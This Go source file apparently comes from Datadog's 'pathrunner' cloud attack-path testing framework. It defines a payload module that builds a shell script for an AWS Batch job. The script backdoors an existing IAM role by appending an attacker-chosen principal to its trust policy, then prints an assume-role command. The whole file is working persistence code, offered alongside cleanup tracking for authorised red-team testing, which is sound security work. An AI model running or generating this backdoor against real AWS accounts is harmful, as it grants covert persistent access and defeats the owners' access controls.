// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package batch

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// BackdoorUpdateRoleTrustPayload generates a shell script that retrieves an existing
// IAM role's trust policy, appends a new Allow statement for a specified principal,
// and updates the trust policy.
//
// This payload generates a multi-command shell script and requires CONTAINER_RUNTIME=generic
// with an image that has sh, the AWS CLI, and jq installed. The amazon/aws-cli image
// includes jq but cannot be used with generic runtime (its entrypoint is "aws");
// use a custom image or one based on a distro with aws-cli-v2 and jq installed.
type BackdoorUpdateRoleTrustPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorUpdateRoleTrustPayload{})
}

func (p *BackdoorUpdateRoleTrustPayload) GetName() string {
	return "backdoor/update-role-trust"
}

func (p *BackdoorUpdateRoleTrustPayload) GetDescription() string {
	return "Append a trust policy statement to an existing IAM role via Batch job (requires CONTAINER_RUNTIME=generic with jq)"
}

func (p *BackdoorUpdateRoleTrustPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorUpdateRoleTrustPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "Name of the IAM role whose trust policy to modify",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to add to the trust policy (ARN or service like lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *BackdoorUpdateRoleTrustPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust payload")
	}
	return nil
}

// GenerateCode returns a shell script that appends a trust policy statement to an existing role.
// Requires CONTAINER_RUNTIME=generic with jq available in the container.
func (p *BackdoorUpdateRoleTrustPayload) GenerateCode(options map[string]string) (string, error) {
	targetRole := options["TARGET_ROLE"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	script := fmt.Sprintf(`set -e

TARGET_ROLE="%s"
TRUST_PRINCIPAL="%s"
PRINCIPAL_KEY="%s"

echo "Retrieving current trust policy for role: $TARGET_ROLE..."
CURRENT_POLICY=$(aws iam get-role --role-name "$TARGET_ROLE" --query 'Role.AssumeRolePolicyDocument' --output json)

if [ -z "$CURRENT_POLICY" ]; then
    echo "FAILED: Could not retrieve trust policy"
    exit 1
fi

echo "Current trust policy:"
echo "$CURRENT_POLICY" | jq .

NEW_STATEMENT=$(jq -n \
    --arg key "$PRINCIPAL_KEY" \
    --arg principal "$TRUST_PRINCIPAL" \
    '{Effect: "Allow", Principal: {($key): $principal}, Action: "sts:AssumeRole"}')

UPDATED_POLICY=$(echo "$CURRENT_POLICY" | jq --argjson stmt "$NEW_STATEMENT" '.Statement += [$stmt]')

echo "Updating trust policy..."
aws iam update-assume-role-policy \
    --role-name "$TARGET_ROLE" \
    --policy-document "$UPDATED_POLICY"

if [ $? -eq 0 ]; then
    echo "SUCCESS: Trust policy updated for role $TARGET_ROLE"
    echo "Principal $TRUST_PRINCIPAL can now assume this role"
    ROLE_ARN=$(aws iam get-role --role-name "$TARGET_ROLE" --query 'Role.Arn' --output text)
    echo "Assume command: aws sts assume-role --role-arn $ROLE_ARN --role-session-name pathrunner-session"
else
    echo "FAILED: Could not update trust policy"
    exit 1
fi
`, targetRole, trustPrincipal, principalKey)

	return strings.TrimLeft(script, "\n"), nil
}

// ReportSideEffects returns the trust policy modification as a tracked resource for cleanup.
func (p *BackdoorUpdateRoleTrustPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetRole := options["TARGET_ROLE"]

	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("trust-policy/%s", targetRole),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"target_role":     targetRole,
				"trust_principal": options["TRUST_PRINCIPAL"],
			},
		},
	}
}

// ProcessResult returns the raw result.
func (p *BackdoorUpdateRoleTrustPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
